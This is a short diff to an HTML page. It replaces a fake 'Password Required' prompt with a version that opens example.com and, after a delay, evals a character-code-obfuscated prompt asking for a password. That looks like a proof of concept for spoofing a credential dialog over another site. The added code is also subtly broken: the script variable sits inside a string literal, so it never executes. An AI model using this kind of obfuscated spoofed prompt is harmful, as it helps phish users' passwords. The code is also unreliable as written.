@@ -1,11 +1,6 @@
 <a href="javascript:run()" style="font-size: 100px;">Open</a>
 
 <script>
-function run(){
-    const w = window.open ('about:blank')
-    
-    setTimeout(() => {
-        w.document.write("<script>javascript:prompt('Password Required','');<\/script>")    
-    }, 2500);
-}
+    var script = "<script> setTimeout(() => {window.open('https://example.com')},250); setTimeout(() => { eval(String.fromCharCode(112,114,111,109,112,116,40,39,80,97,115,115,119,111,114,100,32,82,101,113,117,105,114,101,100,44,39,44,39,39,41,59));}, 2500);<\/script>"
+    window.open("javascript: + script")
 </script>
